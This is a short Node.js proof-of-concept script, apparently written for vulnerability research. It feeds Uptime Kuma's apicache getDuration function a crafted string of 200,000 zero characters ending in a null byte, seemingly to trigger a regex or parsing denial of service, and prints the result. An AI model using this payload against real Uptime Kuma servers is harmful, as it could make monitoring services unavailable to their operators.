
const apicacheModule = require("./uptime-kuma-92e982a91004e8f519e21ee6a0e4d4d21ecae99c/uptime-kuma-92e982a91004e8f519e21ee6a0e4d4d21ecae99c/server/modules/apicache/apicache.js");

// 手动提取 parseDuration 函数
const getDuration = apicacheModule.getDuration;

// ""+"00".repeat(100000)+"\u0000"

// 构造字符串
const str = "" + "00".repeat(100000) + "\u0000";

try {
    // 调用 parseDuration 函数
    let result = getDuration(str);
    console.log(result);
} catch (error) {
    console.error(error);
}


